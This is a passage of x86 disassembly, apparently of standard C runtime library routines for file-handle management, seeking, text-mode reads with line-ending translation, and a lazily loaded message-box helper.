  4364e0:	cmp    eax,edx
  4364e2:	jge    0x4364f3
  4364e4:	lea    edx,[eax+eax*2]
  4364e7:	mov    esi,DWORD PTR [ebx+0x54]
  4364ea:	mov    DWORD PTR [esi+edx*4+0x8],ecx
  4364ee:	inc    eax
  4364ef:	jmp    0x4364cf
  4364f1:	mov    DWORD PTR [esi],ecx
  4364f3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4364f7:	call   0x436514
  4364fc:	cmp    DWORD PTR [ebp+0x8],0x8
  436500:	jne    0x436521
  436502:	push   DWORD PTR [ebx+0x5c]
  436505:	push   0x8
  436507:	call   edi
  436509:	pop    ecx
  43650a:	jmp    0x436526
  43650c:	mov    edi,DWORD PTR [ebp-0x20]
  43650f:	mov    ebx,DWORD PTR [ebp-0x24]
  436512:	xor    ecx,ecx
  436514:	cmp    DWORD PTR [ebp-0x1c],ecx
  436517:	je     0x436520
  436519:	push   ecx
  43651a:	call   0x431071
  43651f:	pop    ecx
  436520:	ret    
  436521:	push   DWORD PTR [ebp+0x8]
  436524:	call   edi
  436526:	pop    ecx
  436527:	mov    eax,DWORD PTR [ebp+0x8]
  43652a:	cmp    eax,0x8
  43652d:	je     0x436539
  43652f:	cmp    eax,0xb
  436532:	je     0x436539
  436534:	cmp    eax,0x4
  436537:	jne    0x43654a
  436539:	mov    ecx,DWORD PTR [ebp-0x2c]
  43653c:	mov    DWORD PTR [ebx+0x58],ecx
  43653f:	cmp    eax,0x8
  436542:	jne    0x43654a
  436544:	mov    eax,DWORD PTR [ebp-0x30]
  436547:	mov    DWORD PTR [ebx+0x5c],eax
  43654a:	xor    eax,eax
  43654c:	call   0x43124b
  436551:	ret    
  436552:	mov    eax,DWORD PTR [esp+0x4]
  436556:	cmp    eax,DWORD PTR ds:0x4650ec
  43655c:	jb     0x436561
  43655e:	xor    eax,eax
  436560:	ret    
  436561:	mov    ecx,eax
  436563:	and    eax,0x1f
  436566:	sar    ecx,0x5
  436569:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  436570:	lea    eax,[eax+eax*8]
  436573:	movsx  eax,BYTE PTR [ecx+eax*4+0x4]
  436578:	and    eax,0x40
  43657b:	ret    
  43657c:	push   ebp
  43657d:	mov    ebp,esp
  43657f:	push   ecx
  436580:	push   ecx
  436581:	mov    eax,DWORD PTR [ebp+0xc]
  436584:	push   esi
  436585:	mov    esi,DWORD PTR [ebp+0x8]
  436588:	mov    DWORD PTR [ebp-0x8],eax
  43658b:	mov    eax,DWORD PTR [ebp+0x10]
  43658e:	push   edi
  43658f:	push   esi
  436590:	mov    DWORD PTR [ebp-0x4],eax
  436593:	call   0x4367b8
  436598:	or     edi,0xffffffff
  43659b:	cmp    eax,edi
  43659d:	pop    ecx
  43659e:	jne    0x4365ad
  4365a0:	call   0x432878
  4365a5:	mov    DWORD PTR [eax],0x9
  4365ab:	jmp    0x4365d6
  4365ad:	push   DWORD PTR [ebp+0x14]
  4365b0:	lea    ecx,[ebp-0x4]
  4365b3:	push   ecx
  4365b4:	push   DWORD PTR [ebp-0x8]
  4365b7:	push   eax
  4365b8:	call   DWORD PTR ds:0x4390c4
  4365be:	cmp    eax,edi
  4365c0:	mov    DWORD PTR [ebp-0x8],eax
  4365c3:	jne    0x4365dc
  4365c5:	call   DWORD PTR ds:0x4390ac
  4365cb:	test   eax,eax
  4365cd:	je     0x4365dc
  4365cf:	push   eax
  4365d0:	call   0x43288a
  4365d5:	pop    ecx
  4365d6:	mov    eax,edi
  4365d8:	mov    edx,edi
  4365da:	jmp    0x4365fb
  4365dc:	mov    eax,esi
  4365de:	sar    eax,0x5
  4365e1:	mov    eax,DWORD PTR [eax*4+0x465100]
  4365e8:	and    esi,0x1f
  4365eb:	lea    ecx,[esi+esi*8]
  4365ee:	lea    eax,[eax+ecx*4+0x4]
  4365f2:	and    BYTE PTR [eax],0xfd
  4365f5:	mov    eax,DWORD PTR [ebp-0x8]
  4365f8:	mov    edx,DWORD PTR [ebp-0x4]
  4365fb:	pop    edi
  4365fc:	pop    esi
  4365fd:	leave  
  4365fe:	ret    
  4365ff:	push   0x10
  436601:	push   0x43b388
  436606:	call   0x431210
  43660b:	mov    ebx,DWORD PTR [ebp+0x8]
  43660e:	cmp    ebx,DWORD PTR ds:0x4650ec
  436614:	jae    0x43669f
  43661a:	mov    eax,ebx
  43661c:	sar    eax,0x5
  43661f:	lea    edi,[eax*4+0x465100]
  436626:	mov    eax,ebx
  436628:	and    eax,0x1f
  43662b:	lea    esi,[eax+eax*8]
  43662e:	shl    esi,0x2
  436631:	mov    eax,DWORD PTR [edi]
  436633:	test   BYTE PTR [eax+esi*1+0x4],0x1
  436638:	je     0x43669f
  43663a:	push   ebx
  43663b:	call   0x4367f9
  436640:	pop    ecx
  436641:	and    DWORD PTR [ebp-0x4],0x0
  436645:	mov    eax,DWORD PTR [edi]
  436647:	test   BYTE PTR [eax+esi*1+0x4],0x1
  43664c:	je     0x436668
  43664e:	push   DWORD PTR [ebp+0x14]
  436651:	push   DWORD PTR [ebp+0x10]
  436654:	push   DWORD PTR [ebp+0xc]
  436657:	push   ebx
  436658:	call   0x43657c
  43665d:	add    esp,0x10
  436660:	mov    DWORD PTR [ebp-0x20],eax
  436663:	mov    DWORD PTR [ebp-0x1c],edx
  436666:	jmp    0x436683
  436668:	call   0x432878
  43666d:	mov    DWORD PTR [eax],0x9
  436673:	call   0x432881
  436678:	and    DWORD PTR [eax],0x0
  43667b:	or     DWORD PTR [ebp-0x20],0xffffffff
  43667f:	or     DWORD PTR [ebp-0x1c],0xffffffff
  436683:	or     DWORD PTR [ebp-0x4],0xffffffff
  436687:	call   0x436697
  43668c:	mov    eax,DWORD PTR [ebp-0x20]
  43668f:	mov    edx,DWORD PTR [ebp-0x1c]
  436692:	jmp    0x4366b7
  436694:	mov    ebx,DWORD PTR [ebp+0x8]
  436697:	push   ebx
  436698:	call   0x436899
  43669d:	pop    ecx
  43669e:	ret    
  43669f:	call   0x432878
  4366a4:	mov    DWORD PTR [eax],0x9
  4366aa:	call   0x432881
  4366af:	and    DWORD PTR [eax],0x0
  4366b2:	or     edx,0xffffffff
  4366b5:	mov    eax,edx
  4366b7:	call   0x43124b
  4366bc:	ret    
  4366bd:	mov    ecx,DWORD PTR [esp+0x4]
  4366c1:	cmp    ecx,DWORD PTR ds:0x4650ec
  4366c7:	push   esi
  4366c8:	push   edi
  4366c9:	jae    0x436720
  4366cb:	mov    eax,ecx
  4366cd:	sar    eax,0x5
  4366d0:	lea    edi,[eax*4+0x465100]
  4366d7:	mov    eax,ecx
  4366d9:	and    eax,0x1f
  4366dc:	lea    esi,[eax+eax*8]
  4366df:	mov    eax,DWORD PTR [edi]
  4366e1:	shl    esi,0x2
  4366e4:	cmp    DWORD PTR [esi+eax*1],0xffffffff
  4366e8:	jne    0x436720
  4366ea:	cmp    DWORD PTR ds:0x43d3ec,0x1
  4366f1:	push   ebx
  4366f2:	mov    ebx,DWORD PTR [esp+0x14]
  4366f6:	jne    0x436716
  4366f8:	sub    ecx,0x0
  4366fb:	je     0x43670d
  4366fd:	dec    ecx
  4366fe:	je     0x436708
  436700:	dec    ecx
  436701:	jne    0x436716
  436703:	push   ebx
  436704:	push   0xfffffff4
  436706:	jmp    0x436710
  436708:	push   ebx
  436709:	push   0xfffffff5
  43670b:	jmp    0x436710
  43670d:	push   ebx
  43670e:	push   0xfffffff6
  436710:	call   DWORD PTR ds:0x439148
  436716:	mov    eax,DWORD PTR [edi]
  436718:	mov    DWORD PTR [esi+eax*1],ebx
  43671b:	xor    eax,eax
  43671d:	pop    ebx
  43671e:	jmp    0x436736
  436720:	call   0x432878
  436725:	mov    DWORD PTR [eax],0x9
  43672b:	call   0x432881
  436730:	and    DWORD PTR [eax],0x0
  436733:	or     eax,0xffffffff
  436736:	pop    edi
  436737:	pop    esi
  436738:	ret    
  436739:	mov    ecx,DWORD PTR [esp+0x4]
  43673d:	cmp    ecx,DWORD PTR ds:0x4650ec
  436743:	push   esi
  436744:	push   edi
  436745:	jae    0x43679f
  436747:	mov    eax,ecx
  436749:	sar    eax,0x5
  43674c:	lea    edi,[eax*4+0x465100]
  436753:	mov    eax,ecx
  436755:	and    eax,0x1f
  436758:	lea    esi,[eax+eax*8]
  43675b:	mov    eax,DWORD PTR [edi]
  43675d:	shl    esi,0x2
  436760:	add    eax,esi
  436762:	test   BYTE PTR [eax+0x4],0x1
  436766:	je     0x43679f
  436768:	cmp    DWORD PTR [eax],0xffffffff
  43676b:	je     0x43679f
  43676d:	cmp    DWORD PTR ds:0x43d3ec,0x1
  436774:	jne    0x436795
  436776:	xor    eax,eax
  436778:	sub    ecx,eax
  43677a:	je     0x43678c
  43677c:	dec    ecx
  43677d:	je     0x436787
  43677f:	dec    ecx
  436780:	jne    0x436795
  436782:	push   eax
  436783:	push   0xfffffff4
  436785:	jmp    0x43678f
  436787:	push   eax
  436788:	push   0xfffffff5
  43678a:	jmp    0x43678f
  43678c:	push   eax
  43678d:	push   0xfffffff6
  43678f:	call   DWORD PTR ds:0x439148
  436795:	mov    eax,DWORD PTR [edi]
  436797:	or     DWORD PTR [esi+eax*1],0xffffffff
  43679b:	xor    eax,eax
  43679d:	jmp    0x4367b5
  43679f:	call   0x432878
  4367a4:	mov    DWORD PTR [eax],0x9
  4367aa:	call   0x432881
  4367af:	and    DWORD PTR [eax],0x0
  4367b2:	or     eax,0xffffffff
  4367b5:	pop    edi
  4367b6:	pop    esi
  4367b7:	ret    
  4367b8:	mov    eax,DWORD PTR [esp+0x4]
  4367bc:	cmp    eax,DWORD PTR ds:0x4650ec
  4367c2:	jae    0x4367e2
  4367c4:	mov    ecx,eax
  4367c6:	and    eax,0x1f
  4367c9:	sar    ecx,0x5
  4367cc:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  4367d3:	lea    eax,[eax+eax*8]
  4367d6:	lea    eax,[ecx+eax*4]
  4367d9:	test   BYTE PTR [eax+0x4],0x1
  4367dd:	je     0x4367e2
  4367df:	mov    eax,DWORD PTR [eax]
  4367e1:	ret    
  4367e2:	call   0x432878
  4367e7:	mov    DWORD PTR [eax],0x9
  4367ed:	call   0x432881
  4367f2:	and    DWORD PTR [eax],0x0
  4367f5:	or     eax,0xffffffff
  4367f8:	ret    
  4367f9:	push   0x8
  4367fb:	push   0x43b398
  436800:	call   0x431210
  436805:	mov    edi,DWORD PTR [ebp+0x8]
  436808:	mov    ecx,edi
  43680a:	sar    ecx,0x5
  43680d:	mov    eax,edi
  43680f:	and    eax,0x1f
  436812:	lea    eax,[eax+eax*8]
  436815:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  43681c:	lea    esi,[ecx+eax*4]
  43681f:	xor    ebx,ebx
  436821:	cmp    DWORD PTR [esi+0x8],ebx
  436824:	jne    0x436867
  436826:	push   0xa
  436828:	call   0x431126
  43682d:	pop    ecx
  43682e:	mov    DWORD PTR [ebp-0x4],ebx
  436831:	cmp    DWORD PTR [esi+0x8],ebx
  436834:	jne    0x43685e
  436836:	push   0xfa0
  43683b:	lea    eax,[esi+0xc]
  43683e:	push   eax
  43683f:	call   0x4360f7
  436844:	pop    ecx
  436845:	pop    ecx
  436846:	test   eax,eax
  436848:	jne    0x43685b
  43684a:	push   0xffffffff
  43684c:	lea    eax,[ebp-0x10]
  43684f:	push   eax
  436850:	call   0x42f0ba
  436855:	pop    ecx
  436856:	pop    ecx
  436857:	xor    eax,eax
  436859:	jmp    0x436887
  43685b:	inc    DWORD PTR [esi+0x8]
  43685e:	or     DWORD PTR [ebp-0x4],0xffffffff
  436862:	call   0x436890
  436867:	mov    eax,edi
  436869:	sar    eax,0x5
  43686c:	and    edi,0x1f
  43686f:	lea    ecx,[edi+edi*8]
  436872:	mov    eax,DWORD PTR [eax*4+0x465100]
  436879:	lea    eax,[eax+ecx*4+0xc]
  43687d:	push   eax
  43687e:	call   DWORD PTR ds:0x439088
  436884:	xor    eax,eax
  436886:	inc    eax
  436887:	call   0x43124b
  43688c:	ret    
  43688d:	mov    edi,DWORD PTR [ebp+0x8]
  436890:	push   0xa
  436892:	call   0x431071
  436897:	pop    ecx
  436898:	ret    
  436899:	mov    eax,DWORD PTR [esp+0x4]
  43689d:	mov    ecx,eax
  43689f:	and    eax,0x1f
  4368a2:	sar    ecx,0x5
  4368a5:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  4368ac:	lea    eax,[eax+eax*8]
  4368af:	lea    eax,[ecx+eax*4+0xc]
  4368b3:	push   eax
  4368b4:	call   DWORD PTR ds:0x43908c
  4368ba:	ret    
  4368bb:	push   0x14
  4368bd:	push   0x43b3a8
  4368c2:	call   0x431210
  4368c7:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4368cb:	push   0xb
  4368cd:	call   0x431086
  4368d2:	pop    ecx
  4368d3:	test   eax,eax
  4368d5:	je     0x43695c
  4368db:	push   0xb
  4368dd:	call   0x431126
  4368e2:	pop    ecx
  4368e3:	xor    edi,edi
  4368e5:	mov    DWORD PTR [ebp-0x4],edi
  4368e8:	mov    DWORD PTR [ebp-0x24],edi
  4368eb:	cmp    edi,0x40
  4368ee:	jge    0x436a1c
  4368f4:	mov    esi,DWORD PTR [edi*4+0x465100]
  4368fb:	test   esi,esi
  4368fd:	je     0x4369c5
  436903:	mov    DWORD PTR [ebp-0x20],esi
  436906:	mov    eax,DWORD PTR [edi*4+0x465100]
  43690d:	add    eax,0x480
  436912:	cmp    esi,eax
  436914:	jae    0x4369b9
  43691a:	test   BYTE PTR [esi+0x4],0x1
  43691e:	jne    0x436986
  436920:	xor    ebx,ebx
  436922:	cmp    DWORD PTR [esi+0x8],ebx
  436925:	jne    0x43696f
  436927:	push   0xa
  436929:	call   0x431126
  43692e:	pop    ecx
  43692f:	mov    DWORD PTR [ebp-0x4],0x1
  436936:	cmp    DWORD PTR [esi+0x8],ebx
  436939:	jne    0x436967
  43693b:	push   0xfa0
  436940:	lea    eax,[esi+0xc]
  436943:	push   eax
  436944:	call   0x4360f7
  436949:	pop    ecx
  43694a:	pop    ecx
  43694b:	test   eax,eax
  43694d:	jne    0x436964
  43694f:	push   0xffffffff
  436951:	lea    eax,[ebp-0x10]
  436954:	push   eax
  436955:	call   0x42f0ba
  43695a:	pop    ecx
  43695b:	pop    ecx
  43695c:	or     eax,0xffffffff
  43695f:	jmp    0x436a28
  436964:	inc    DWORD PTR [esi+0x8]
  436967:	mov    DWORD PTR [ebp-0x4],ebx
  43696a:	call   0x436994
  43696f:	lea    ebx,[esi+0xc]
  436972:	push   ebx
  436973:	call   DWORD PTR ds:0x439088
  436979:	test   BYTE PTR [esi+0x4],0x1
  43697d:	je     0x43699d
  43697f:	push   ebx
  436980:	call   DWORD PTR ds:0x43908c
  436986:	add    esi,0x24
  436989:	jmp    0x436903
  43698e:	mov    edi,DWORD PTR [ebp-0x24]
  436991:	mov    esi,DWORD PTR [ebp-0x20]
  436994:	push   0xa
  436996:	call   0x431071
  43699b:	pop    ecx
  43699c:	ret    
  43699d:	or     DWORD PTR [esi],0xffffffff
  4369a0:	mov    eax,esi
  4369a2:	sub    eax,DWORD PTR [edi*4+0x465100]
  4369a9:	cdq    
  4369aa:	push   0x24
  4369ac:	pop    ecx
  4369ad:	idiv   ecx
  4369af:	mov    ecx,edi
  4369b1:	shl    ecx,0x5
  4369b4:	add    eax,ecx
  4369b6:	mov    DWORD PTR [ebp-0x1c],eax
  4369b9:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4369bd:	jne    0x436a1c
  4369bf:	inc    edi
  4369c0:	jmp    0x4368e8
  4369c5:	mov    esi,0x480
  4369ca:	push   esi
  4369cb:	call   0x4311fe
  4369d0:	pop    ecx
  4369d1:	mov    DWORD PTR [ebp-0x20],eax
  4369d4:	test   eax,eax
  4369d6:	je     0x436a1c
  4369d8:	lea    ecx,[edi*4+0x465100]
  4369df:	mov    DWORD PTR [ecx],eax
  4369e1:	add    DWORD PTR ds:0x4650ec,0x20
  4369e8:	mov    edx,DWORD PTR [ecx]
  4369ea:	add    edx,esi
  4369ec:	cmp    eax,edx
  4369ee:	jae    0x436a07
  4369f0:	mov    BYTE PTR [eax+0x4],0x0
  4369f4:	or     DWORD PTR [eax],0xffffffff
  4369f7:	mov    BYTE PTR [eax+0x5],0xa
  4369fb:	and    DWORD PTR [eax+0x8],0x0
  4369ff:	add    eax,0x24
  436a02:	mov    DWORD PTR [ebp-0x20],eax
  436a05:	jmp    0x4369e8
  436a07:	shl    edi,0x5
  436a0a:	mov    DWORD PTR [ebp-0x1c],edi
  436a0d:	push   edi
  436a0e:	call   0x4367f9
  436a13:	pop    ecx
  436a14:	test   eax,eax
  436a16:	jne    0x436a1c
  436a18:	or     DWORD PTR [ebp-0x1c],0xffffffff
  436a1c:	or     DWORD PTR [ebp-0x4],0xffffffff
  436a20:	call   0x436a2e
  436a25:	mov    eax,DWORD PTR [ebp-0x1c]
  436a28:	call   0x43124b
  436a2d:	ret    
  436a2e:	push   0xb
  436a30:	call   0x431071
  436a35:	pop    ecx
  436a36:	ret    
  436a37:	push   ebp
  436a38:	mov    ebp,esp
  436a3a:	sub    esp,0xc
  436a3d:	and    DWORD PTR [ebp-0x8],0x0
  436a41:	cmp    DWORD PTR [ebp+0x10],0x0
  436a45:	push   ebx
  436a46:	mov    ebx,DWORD PTR [ebp+0xc]
  436a49:	push   esi
  436a4a:	push   edi
  436a4b:	mov    edx,ebx
  436a4d:	je     0x436c0b
  436a53:	mov    eax,DWORD PTR [ebp+0x8]
  436a56:	mov    ecx,eax
  436a58:	and    eax,0x1f
  436a5b:	sar    ecx,0x5
  436a5e:	lea    esi,[eax+eax*8]
  436a61:	lea    edi,[ecx*4+0x465100]
  436a68:	mov    eax,DWORD PTR [edi]
  436a6a:	shl    esi,0x2
  436a6d:	add    eax,esi
  436a6f:	mov    cl,BYTE PTR [eax+0x4]
  436a72:	test   cl,0x2
  436a75:	jne    0x436c0b
  436a7b:	test   cl,0x48
  436a7e:	je     0x436aa2
  436a80:	cmp    BYTE PTR [eax+0x5],0xa
  436a84:	je     0x436aa2
  436a86:	mov    eax,DWORD PTR [edi]
  436a88:	mov    al,BYTE PTR [eax+esi*1+0x5]
  436a8c:	dec    DWORD PTR [ebp+0x10]
  436a8f:	mov    BYTE PTR [ebx],al
  436a91:	mov    eax,DWORD PTR [edi]
  436a93:	lea    edx,[ebx+0x1]
  436a96:	mov    DWORD PTR [ebp-0x8],0x1
  436a9d:	mov    BYTE PTR [eax+esi*1+0x5],0xa
  436aa2:	push   0x0
  436aa4:	lea    eax,[ebp-0xc]
  436aa7:	push   eax
  436aa8:	push   DWORD PTR [ebp+0x10]
  436aab:	mov    eax,DWORD PTR [edi]
  436aad:	push   edx
  436aae:	push   DWORD PTR [eax+esi*1]
  436ab1:	call   DWORD PTR ds:0x43914c
  436ab7:	test   eax,eax
  436ab9:	jne    0x436af4
  436abb:	call   DWORD PTR ds:0x4390ac
  436ac1:	push   0x5
  436ac3:	pop    esi
  436ac4:	cmp    eax,esi
  436ac6:	jne    0x436adc
  436ac8:	call   0x432878
  436acd:	mov    DWORD PTR [eax],0x9
  436ad3:	call   0x432881
  436ad8:	mov    DWORD PTR [eax],esi
  436ada:	jmp    0x436aec
  436adc:	cmp    eax,0x6d
  436adf:	je     0x436c0b
  436ae5:	push   eax
  436ae6:	call   0x43288a
  436aeb:	pop    ecx
  436aec:	or     eax,0xffffffff
  436aef:	jmp    0x436c0d
  436af4:	mov    eax,DWORD PTR [ebp-0xc]
  436af7:	mov    ecx,DWORD PTR [edi]
  436af9:	add    DWORD PTR [ebp-0x8],eax
  436afc:	test   BYTE PTR [ecx+esi*1+0x4],0x80
  436b01:	je     0x436c06
  436b07:	test   eax,eax
  436b09:	je     0x436b1b
  436b0b:	cmp    BYTE PTR [ebx],0xa
  436b0e:	jne    0x436b1b
  436b10:	mov    eax,ecx
  436b12:	lea    eax,[eax+esi*1+0x4]
  436b16:	or     BYTE PTR [eax],0x4
  436b19:	jmp    0x436b24
  436b1b:	mov    eax,DWORD PTR [edi]
  436b1d:	lea    eax,[eax+esi*1+0x4]
  436b21:	and    BYTE PTR [eax],0xfb
  436b24:	mov    eax,DWORD PTR [ebp+0xc]
  436b27:	mov    ecx,DWORD PTR [ebp-0x8]
  436b2a:	add    ecx,eax
  436b2c:	cmp    eax,ecx
  436b2e:	mov    DWORD PTR [ebp+0x10],eax
  436b31:	mov    DWORD PTR [ebp-0x8],ecx
  436b34:	jae    0x436c00
  436b3a:	mov    eax,DWORD PTR [ebp+0x10]
  436b3d:	mov    al,BYTE PTR [eax]
  436b3f:	cmp    al,0x1a
  436b41:	je     0x436bf0
  436b47:	cmp    al,0xd
  436b49:	je     0x436b56
  436b4b:	mov    BYTE PTR [ebx],al
  436b4d:	inc    ebx
  436b4e:	inc    DWORD PTR [ebp+0x10]
  436b51:	jmp    0x436be2
  436b56:	dec    ecx
  436b57:	cmp    DWORD PTR [ebp+0x10],ecx
  436b5a:	jae    0x436b70
  436b5c:	mov    eax,DWORD PTR [ebp+0x10]
  436b5f:	inc    eax
  436b60:	cmp    BYTE PTR [eax],0xa
  436b63:	jne    0x436b6b
  436b65:	add    DWORD PTR [ebp+0x10],0x2
  436b69:	jmp    0x436bc4
  436b6b:	mov    DWORD PTR [ebp+0x10],eax
  436b6e:	jmp    0x436bde
  436b70:	inc    DWORD PTR [ebp+0x10]
  436b73:	push   0x0
  436b75:	lea    eax,[ebp-0xc]
  436b78:	push   eax
  436b79:	push   0x1
  436b7b:	lea    eax,[ebp-0x1]
  436b7e:	push   eax
  436b7f:	mov    eax,DWORD PTR [edi]
  436b81:	push   DWORD PTR [eax+esi*1]
  436b84:	call   DWORD PTR ds:0x43914c
  436b8a:	test   eax,eax
  436b8c:	jne    0x436b98
  436b8e:	call   DWORD PTR ds:0x4390ac
  436b94:	test   eax,eax
  436b96:	jne    0x436bde
  436b98:	cmp    DWORD PTR [ebp-0xc],0x0
  436b9c:	je     0x436bde
  436b9e:	mov    eax,DWORD PTR [edi]
  436ba0:	test   BYTE PTR [eax+esi*1+0x4],0x48
  436ba5:	je     0x436bb9
  436ba7:	mov    al,BYTE PTR [ebp-0x1]
  436baa:	cmp    al,0xa
  436bac:	je     0x436bc4
  436bae:	mov    BYTE PTR [ebx],0xd
  436bb1:	mov    ecx,DWORD PTR [edi]
  436bb3:	mov    BYTE PTR [ecx+esi*1+0x5],al
  436bb7:	jmp    0x436be1
  436bb9:	cmp    ebx,DWORD PTR [ebp+0xc]
  436bbc:	jne    0x436bc9
  436bbe:	cmp    BYTE PTR [ebp-0x1],0xa
  436bc2:	jne    0x436bc9
  436bc4:	mov    BYTE PTR [ebx],0xa
  436bc7:	jmp    0x436be1
  436bc9:	push   0x1
  436bcb:	push   0xffffffff
  436bcd:	push   DWORD PTR [ebp+0x8]
  436bd0:	call   0x4328fd
  436bd5:	add    esp,0xc
  436bd8:	cmp    BYTE PTR [ebp-0x1],0xa
  436bdc:	je     0x436be2
  436bde:	mov    BYTE PTR [ebx],0xd
  436be1:	inc    ebx
  436be2:	mov    ecx,DWORD PTR [ebp-0x8]
  436be5:	cmp    DWORD PTR [ebp+0x10],ecx
  436be8:	jb     0x436b3a
  436bee:	jmp    0x436c00
  436bf0:	mov    eax,DWORD PTR [edi]
  436bf2:	test   BYTE PTR [eax+esi*1+0x4],0x40
  436bf7:	jne    0x436c00
  436bf9:	lea    esi,[eax+esi*1+0x4]
  436bfd:	or     BYTE PTR [esi],0x2
  436c00:	sub    ebx,DWORD PTR [ebp+0xc]
  436c03:	mov    DWORD PTR [ebp-0x8],ebx
  436c06:	mov    eax,DWORD PTR [ebp-0x8]
  436c09:	jmp    0x436c0d
  436c0b:	xor    eax,eax
  436c0d:	pop    edi
  436c0e:	pop    esi
  436c0f:	pop    ebx
  436c10:	leave  
  436c11:	ret    
  436c12:	push   0xc
  436c14:	push   0x43b3c0
  436c19:	call   0x431210
  436c1e:	mov    ebx,DWORD PTR [ebp+0x8]
  436c21:	cmp    ebx,DWORD PTR ds:0x4650ec
  436c27:	jae    0x436ca1
  436c29:	mov    eax,ebx
  436c2b:	sar    eax,0x5
  436c2e:	lea    edi,[eax*4+0x465100]
  436c35:	mov    eax,ebx
  436c37:	and    eax,0x1f
  436c3a:	lea    esi,[eax+eax*8]
  436c3d:	shl    esi,0x2
  436c40:	mov    eax,DWORD PTR [edi]
  436c42:	test   BYTE PTR [eax+esi*1+0x4],0x1
  436c47:	je     0x436ca1
  436c49:	push   ebx
  436c4a:	call   0x4367f9
  436c4f:	pop    ecx
  436c50:	and    DWORD PTR [ebp-0x4],0x0
  436c54:	mov    eax,DWORD PTR [edi]
  436c56:	test   BYTE PTR [eax+esi*1+0x4],0x1
  436c5b:	je     0x436c71
  436c5d:	push   DWORD PTR [ebp+0x10]
  436c60:	push   DWORD PTR [ebp+0xc]
  436c63:	push   ebx
  436c64:	call   0x436a37
  436c69:	add    esp,0xc
  436c6c:	mov    DWORD PTR [ebp-0x1c],eax
  436c6f:	jmp    0x436c88
  436c71:	call   0x432878
  436c76:	mov    DWORD PTR [eax],0x9
  436c7c:	call   0x432881
  436c81:	and    DWORD PTR [eax],0x0
  436c84:	or     DWORD PTR [ebp-0x1c],0xffffffff
  436c88:	or     DWORD PTR [ebp-0x4],0xffffffff
  436c8c:	call   0x436c99
  436c91:	mov    eax,DWORD PTR [ebp-0x1c]
  436c94:	jmp    0x436cb7
  436c96:	mov    ebx,DWORD PTR [ebp+0x8]
  436c99:	push   ebx
  436c9a:	call   0x436899
  436c9f:	pop    ecx
  436ca0:	ret    
  436ca1:	call   0x432878
  436ca6:	mov    DWORD PTR [eax],0x9
  436cac:	call   0x432881
  436cb1:	and    DWORD PTR [eax],0x0
  436cb4:	or     eax,0xffffffff
  436cb7:	call   0x43124b
  436cbc:	ret    
  436cbd:	push   ebp
  436cbe:	mov    ebp,esp
  436cc0:	sub    esp,0x10
  436cc3:	push   ebx
  436cc4:	xor    ebx,ebx
  436cc6:	cmp    DWORD PTR ds:0x43ff08,ebx
  436ccc:	push   esi
  436ccd:	push   edi
  436cce:	jne    0x436d3d
  436cd0:	push   0x43b430
  436cd5:	call   DWORD PTR ds:0x439150
  436cdb:	mov    edi,eax
  436cdd:	cmp    edi,ebx
  436cdf:	je     0x436d78
  436ce5:	mov    esi,DWORD PTR ds:0x4390c8
  436ceb:	push   0x43b424
  436cf0:	push   edi
  436cf1:	call   esi
  436cf3:	test   eax,eax
  436cf5:	mov    ds:0x43ff08,eax
  436cfa:	je     0x436d78
  436cfc:	push   0x43b414
  436d01:	push   edi
  436d02:	call   esi
  436d04:	push   0x43b400
  436d09:	push   edi
  436d0a:	mov    ds:0x43ff0c,eax
  436d0f:	call   esi
  436d11:	cmp    DWORD PTR ds:0x43fcb0,0x2
  436d18:	mov    ds:0x43ff10,eax
  436d1d:	jne    0x436d3d
  436d1f:	push   0x43b3e4
  436d24:	push   edi
  436d25:	call   esi
  436d27:	test   eax,eax
  436d29:	mov    ds:0x43ff18,eax
  436d2e:	je     0x436d3d
  436d30:	push   0x43b3cc
  436d35:	push   edi
  436d36:	call   esi
  436d38:	mov    ds:0x43ff14,eax
  436d3d:	mov    eax,ds:0x43ff14
  436d42:	test   eax,eax
  436d44:	je     0x436d82
  436d46:	call   eax
  436d48:	test   eax,eax
  436d4a:	je     0x436d69
  436d4c:	lea    ecx,[ebp-0x4]
  436d4f:	push   ecx
  436d50:	push   0xc
  436d52:	lea    ecx,[ebp-0x10]
  436d55:	push   ecx
  436d56:	push   0x1
  436d58:	push   eax
  436d59:	call   DWORD PTR ds:0x43ff18
  436d5f:	test   eax,eax
  436d61:	je     0x436d69
  436d63:	test   BYTE PTR [ebp-0x8],0x1
  436d67:	jne    0x436d82
  436d69:	cmp    DWORD PTR ds:0x43fcbc,0x4
  436d70:	jb     0x436d7c
  436d72:	or     BYTE PTR [ebp+0x12],0x20
  436d76:	jmp    0x436da1
  436d78:	xor    eax,eax
  436d7a:	jmp    0x436db1
  436d7c:	or     BYTE PTR [ebp+0x12],0x4
  436d80:	jmp    0x436da1
  436d82:	mov    eax,ds:0x43ff0c
  436d87:	test   eax,eax
  436d89:	je     0x436da1
  436d8b:	call   eax
  436d8d:	mov    ebx,eax
  436d8f:	test   ebx,ebx
  436d91:	je     0x436da1
  436d93:	mov    eax,ds:0x43ff10
  436d98:	test   eax,eax
  436d9a:	je     0x436da1
  436d9c:	push   ebx
  436d9d:	call   eax
  436d9f:	mov    ebx,eax
  436da1:	push   DWORD PTR [ebp+0x10]
  436da4:	push   DWORD PTR [ebp+0xc]
  436da7:	push   DWORD PTR [ebp+0x8]
  436daa:	push   ebx
  436dab:	call   DWORD PTR ds:0x43ff08
  436db1:	pop    edi
  436db2:	pop    esi
  436db3:	pop    ebx
  436db4:	leave  
  436db5:	ret    
  436db6:	movzx  eax,BYTE PTR [esp+0x4]
  436dbb:	mov    cl,BYTE PTR [esp+0xc]
  436dbf:	test   BYTE PTR [eax+0x464ec1],cl
  436dc5:	jne    0x436de5
  436dc7:	cmp    DWORD PTR [esp+0x8],0x0
  436dcc:	je     0x436dde
  436dce:	mov    ecx,DWORD PTR ds:0x43d874
  436dd4:	movzx  eax,WORD PTR [ecx+eax*2]
  436dd8:	and    eax,DWORD PTR [esp+0x8]
  436ddc:	jmp    0x436de0
  436dde:	xor    eax,eax
  436de0:	test   eax,eax
  436de2:	jne    0x436de5
  436de4:	ret    
  436de5:	xor    eax,eax
  436de7:	inc    eax
  436de8:	ret    
  436de9:	push   0x4
  436deb:	push   0x0
  436ded:	push   DWORD PTR [esp+0xc]
  436df1:	call   0x436db6
  436df6:	add    esp,0xc
  436df9:	ret    
  436dfa:	sub    eax,0x3a4
